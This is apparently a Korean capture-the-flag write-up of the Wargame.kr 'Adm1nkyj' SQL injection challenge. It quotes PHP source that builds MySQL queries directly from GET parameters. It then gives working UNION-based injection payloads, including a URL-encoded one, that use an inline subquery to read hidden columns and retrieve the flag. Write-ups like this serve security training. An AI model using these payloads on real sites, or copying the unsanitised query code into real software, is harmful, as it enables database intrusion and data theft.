## [Wargame.kr] - Adm1nkyj 

2018-08-06 Plit00 김두형



문제를 보자...

<img width="889" alt="wargame kr - 2 1 2018-08-01 02-27-39" src="https://user-images.githubusercontent.com/40850499/43504269-b3ada20c-959d-11e8-8148-229d324481e4.png">

> 즐거운 SQL injection challenge!!! 


$$
> start를 눌러보자 <
$$


```php
<?php
    error_reporting(0);
    
    include("./config.php"); // hidden column name
    include("../lib.php"); // auth_code function

    mysql_connect("localhost","adm1nkyj","adm1nkyj_pz");
    mysql_select_db("adm1nkyj");

    /**********************************************************************************************************************/
```

> Mysql 서버에서 adm1nkyj와 adm1nkyj_pz를 불러온다. 또한 select_db is adm1nkyj ~



```javascript
 function rand_string()
    {
        $string = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz";
        return str_shuffle($string);
    }

    function reset_flag($count_column, $flag_column)
    {
        $flag = rand_string();
        $query = mysql_fetch_array(mysql_query("SELECT $count_column, $flag_column FROM findflag_2"));
        if($query[$count_column] == 150)
        {
            if(mysql_query("UPDATE findflag_2 SET $flag_column='{$flag}';"))
            {
                mysql_query("UPDATE findflag_2 SET $count_column=0;");
                echo "reset flag<hr>";
            }
            return $flag;
        }
        else
        {
            mysql_query("UPDATE findflag_2 SET $count_column=($query[$count_column] + 1);");
        }
        return $query[$flag_column];
    }

    function get_pw($pw_column){
        $query = mysql_fetch_array(mysql_query("select $pw_column from findflag_2 limit 1"));
        return $query[$pw_column];
    }
```

150번 id를 입력할때마다 초기화룰 하고 쿼리문을 날려 (error) blind sql injection은 안된다.



일단 첫번째로 id값을 알아내야하는데 or / = 과 같은 비교연산자들은 막혀있지 않기때문에 id값을 알아낼 수 있다.
또한, pw도 같은 방식으로 mysql_query에서는 {$id} 와 같은 변수 값을 쿼리에 넣을 수 있다. 
그리고 password_column도 알아내는 것이 가능하다.



```php
 $tmp_flag = "";
    $tmp_pw = "";
    $id = $_GET['id'];
    $pw = $_GET['pw'];
    $flags = $_GET['flag'];
    if(isset($id))
    {
        if(preg_match("/information|schema|user/i", $id) || substr_count($id,"(") > 1)  exit("no hack");
        if(preg_match("/information|schema|user/i", $pw) || substr_count($pw,"(") > 1) exit("no hack");
        $tmp_flag = reset_flag($count_column, $flag_column);
        $tmp_pw = get_pw($pw_column);
        $query = mysql_fetch_array(mysql_query("SELECT * FROM findflag_2 WHERE 
        -----------------------------------------------
        $id_column='{$id}' and $pw_column='{$pw}';"));
        -----------------------------------------------
        if($query[$id_column])
        {
            if(isset($pw) && isset($flags) && $pw === $tmp_pw && $flags === $tmp_flag)
            {
                echo "good job!!<br />FLAG : <b>".auth_code("adm1nkyj")."</b><hr>";
            }
            else
            {
                echo "Hello ".$query[$id_column]."<hr>";
            }
        }
    } else {
        highlight_file(__FILE__);
    }
```

———로 표시한 $id_column 이 부분을 본다면 $id에서 '을 넣어주면 $pw_column='{$pw} 이런식으로 $pw_column을 '로 덮어서 mysql_query에 변수 값을 넣어줄 수 있다.

이부분은 'union select 1,2,3,4,5를 이용해준다면 Hello 2 가 출력이된다.


$$
-- 반 풀었다 --
$$

```php
1. count_column / flag_column find~

2. $query = mysql_fetch_array(mysql_query("SELECT $count_column, $flag_column FROM findflag_2"))

3. selet $pw_column from findflag_2 limit 1

4. $tmp_flag = reset_flag($count_column, $flag_column);
        $tmp_pw = get_pw($pw_column);
        $query = mysql_fetch_array(mysql_query("SELECT * FROM findflag_2 WHERE $id_column='{$id}' and $pw_column='{$pw}';"));
        if($query[$id_column])
        {
            if(isset($pw) && isset($flags) && $pw === $tmp_pw && $flags === $tmp_flag)
            {
                echo "good job!!<br/>FLAG : <b>".auth_code("adm1nkyj")."</b><hr>";
            }
            else
            {
                echo "Hello ".$query[$id_column]."<hr>";
            }
           
```

이제 우리는 table_name을 알고 column_name만 알면 된다.
그럼 우리는 inline view를 사용하면 된다.



```mysql
id = 'or "='
pw = 'union select 1,2,3,4,4;%00%20A
flag = 'union select 1,flag,3,4,5 from (select 1,2,3,4 as flag,5 union select * from findflag_2 limit 1,1) as aa; A
```

flag = 'union select 1,flag,3,4,5 from (select 1,2,3,4 as flag,5 union select * from findflag_2 limit 1,1) as aa; 
으로 하면 select 1,flag,3,4,5가 출력이 되는데 from에 들어간 서브 쿼리가 실행되게 된다.



임시로 1 2 3 4 5 라는 임시 column 이 만들어지게 되는데   4는 우리가 뒤에 썼던 as를 통해서 flag가 된다.



그러면 union으로 findflag_2에 결과가 들어간다.

```mysql
1.id=%27%20union%20select%201%2cq%2c3%2c4%2c5%20from%20(select%201%2c2%2c3%2c4%20as%20q%20%2c5%20union%20select%20*%20from%20findflag_2)%20as%20t%20limit%201%2c1%23

2. Select * from users where id =‘’ union select 1,a,3 from(select 1,2,3, as a union select * from users)c;

```





Clear~!
